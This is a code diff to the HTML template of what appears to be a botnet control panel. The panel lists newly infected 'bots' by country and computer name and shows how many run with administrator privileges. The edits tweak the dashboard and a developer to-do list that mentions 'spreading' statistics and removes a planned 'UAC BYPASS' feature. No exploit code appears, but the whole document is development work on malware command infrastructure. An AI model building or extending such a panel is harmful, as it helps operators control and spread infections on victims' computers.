@@ -136,7 +136,7 @@ wait a bit
                 <div class="row">
                     <div class="col-lg-12 col-md-6 col-sm-12">
                         <div class="stats-with-chart-1 block">
-                            <div class="title"><strong class="d-block"> Privileges</strong><span class="d-block">Lorem ipsum dolor sit</span>
+                            <div class="title"><strong class="d-block"> Privileges</strong><span class="d-block">Privilegs from Clients</span>
                             </div>
                             <div class="row d-flex align-items-top justify-content-between">
                                 <div class="col-12">
@@ -176,10 +176,15 @@ wait a bit
                     <div class="title"><strong class="d-block"> Latest Installs </strong><span class="d-block">These bots are the newest</span></div>
                     <div class="latestInstalls">
                         {foreach from=$last5Installs item=install}
+
                             <div class="install">
                                 <div class="country">
-                                    <img src="{$includeDir}assets/img/flags/flags/{$install.country|lower}.png">
-                                    <span>{$install.country}</span>
+                                    {if $install.country == "unknow"}
+                                        <span>N/A</span>
+                                        {else}
+                                        <img src="{$includeDir}assets/img/flags/flags/{$install.country|lower}.png">
+                                        <span>{$install.country}</span>
+                                    {/if}
                                 </div>
                                 <div class="computername">
                                     {$install.computrername}
@@ -237,17 +242,12 @@ wait a bit
                 <br>
                 +Suggestions:<br>
                 <br>
-                -Add when you highlight the map it shows country name and total bots from this country
-                <br>
                 -Add a circle for Privielges (how many admin and how many users %)<br>
-                -Add paging numbers for bots in this template, and option to show all<br>
-<br>
+                <br>
                 -Botinfo: Update all bot's info, fix ram calculation
                 <br>
                 -Add spreading tags (dont forget to put it on bot info) + and statistics on /dashboard (just a pie, should be next to top countries. So the order will be Latest Installs, Top Countries, Spread Statistics) <br>
-<br>
-                -Chat System Plugin?
-                -UAC BYPASS (plugin or directly built in the bot)
+
 
             </div>
 
